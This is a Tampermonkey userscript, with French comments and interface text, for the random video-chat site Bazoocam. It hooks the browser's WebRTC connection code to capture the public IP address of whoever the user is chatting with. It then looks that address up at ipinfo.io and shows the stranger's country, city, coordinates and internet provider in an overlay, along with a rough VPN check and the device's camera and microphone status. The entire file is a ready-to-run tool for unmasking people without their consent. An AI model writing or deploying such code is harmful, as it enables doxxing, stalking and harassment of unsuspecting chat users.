// ==UserScript==
// @name         Bazoocam WebRTC Tracker with VPN/Proxy Detection
// @namespace    http://tampermonkey.net/
// @version      2.6
// @description  Capture les connexions WebRTC sur Bazoocam.org, affiche les données IP, détecte les périphériques et vérifie si un VPN ou un proxy est utilisé.
// @author       exploit1337_
// @match        *://*.bazoocam.org/*
// @grant        GM_addStyle
// ==/UserScript==

(function () {
    'use strict';

    // Injection du script WebRTC dans la page
    const script = document.createElement("script");
    script.textContent = `
        (function() {
            console.log("WebRTC Script Injected");

            // Vérifie la disponibilité du microphone et de la caméra
            navigator.mediaDevices.enumerateDevices().then(devices => {
                let hasMicrophone = false;
                let hasCamera = false;

                devices.forEach(device => {
                    if (device.kind === "audioinput") {
                        hasMicrophone = true;
                    }
                    if (device.kind === "videoinput") {
                        hasCamera = true;
                    }
                });

                // Envoi des informations sur les périphériques à la page
                window.dispatchEvent(new CustomEvent("device-status-detected", {
                    detail: { hasMicrophone, hasCamera }
                }));
            });

            window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
            window.RTCPeerConnection = function (...args) {
                const pc = new window.oRTCPeerConnection(...args);
                pc.oaddIceCandidate = pc.addIceCandidate;
                pc.addIceCandidate = function (iceCandidate, ...rest) {
                    const fields = iceCandidate.candidate.split(' ');
                    if (fields[7] === 'srflx') {
                        const ip = fields[4];
                        console.log("Captured IP:", ip);

                        // Envoi des données IP à la page
                        window.dispatchEvent(new CustomEvent("webrtc-ip-detected", { detail: ip }));
                    }
                    return pc.oaddIceCandidate(iceCandidate, ...rest);
                };
                return pc;
            };
        })();
    `;
    document.documentElement.appendChild(script);

    // UI pour afficher les informations capturées
    const uiBox = document.createElement("div");
    uiBox.id = "geoInfoBox";
    uiBox.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.95);
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            font-size: 12px;
            font-family: Arial, sans-serif;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
            z-index: 9999;
            max-width: 300px;
        ">
            <h4 style="margin-top: 0; text-align: center;">Bazoocam Tracker avec Détection VPN/Proxy</h4>
            <div id="geoInfo">
                <p style="margin: 10px 0;">Connectez-vous à une personne pour voir ses données IP.</p>
            </div>
            <div id="deviceInfo" style="margin-top: 10px;">
                <p>Détection des périphériques...</p>
            </div>
            <div id="vpnProxyInfo" style="margin-top: 10px;">
                <p>Détection VPN/Proxy...</p>
            </div>
            <button id="clearLogs" style="
                width: 100%;
                background: #ff4f4f;
                color: white;
                border: none;
                padding: 8px 12px;
                border-radius: 5px;
                margin-top: 10px;
                cursor: pointer;
            ">Effacer les Logs</button>
        </div>
    `;
    document.body.appendChild(uiBox);

    // Effacement des logs
    document.getElementById("clearLogs").onclick = function () {
        document.getElementById("geoInfo").innerHTML = "<p>Connectez-vous à une personne pour voir ses données IP.</p>";
        document.getElementById("deviceInfo").innerHTML = "<p>Détection des périphériques...</p>";
        document.getElementById("vpnProxyInfo").innerHTML = "<p>Détection VPN/Proxy...</p>";
    };

    // Écoute des événements pour afficher les données IP
    window.addEventListener("webrtc-ip-detected", function (event) {
        const ip = event.detail;
        console.log("IP Capturée :", ip);
        updateGeoInfo(ip);
    });

    // Écoute des événements pour afficher les informations sur les périphériques
    window.addEventListener("device-status-detected", function (event) {
        const { hasMicrophone, hasCamera } = event.detail;
        console.log("Statut des périphériques détecté :", { hasMicrophone, hasCamera });

        const deviceInfo = `
            <b>Has Microphone:</b> ${hasMicrophone ? "Yes" : "No"}<br>
            <b>Has Camera:</b> ${hasCamera ? "Yes" : "No"}<br>
        `;
        document.getElementById("deviceInfo").innerHTML = deviceInfo;
    });

    // Fonction pour mettre à jour les informations IP (et vérifier VPN/Proxy)
    async function updateGeoInfo(ip) {
        fetch(`https://ipinfo.io/${ip}/geo`)
            .then(response => response.json())
            .then(result => {
                // Vérification VPN/Proxy basée sur les données de l'ISP
                let isVpnProxy = false;
                if (result.org && (result.org.includes("VPN") || result.org.includes("Proxy"))) {
                    isVpnProxy = true;
                }

                const info = `
                    <b>IP Adresse :</b> ${ip}<br>
                    <b>Pays :</b> ${result.country || "Non disponible"}<br>
                    <b>Région :</b> ${result.region || "Non disponible"}<br>
                    <b>Ville :</b> ${result.city || "Non disponible"}<br>
                    <b>Latitude, Longitude :</b> ${result.loc || "Non disponible"}<br>
                    <b>Organisation :</b> ${result.org || "Non disponible"}<br>
                    <b>Fuseau Horaire :</b> ${result.timezone || "Non disponible"}<br>
                `;
                document.getElementById("geoInfo").innerHTML = info;

                const vpnProxyInfo = `
                    <b>VPN/Proxy Détecté:</b> ${isVpnProxy ? "Yes" : "No"}<br>
                `;
                document.getElementById("vpnProxyInfo").innerHTML = vpnProxyInfo;
            })
            .catch(error => {
                console.error("Erreur lors de la récupération des données IP :", error);
                document.getElementById("geoInfo").innerHTML = `<span style="color: red;">Erreur de récupération des données pour l'IP : ${ip}</span>`;
            });
    }
})();

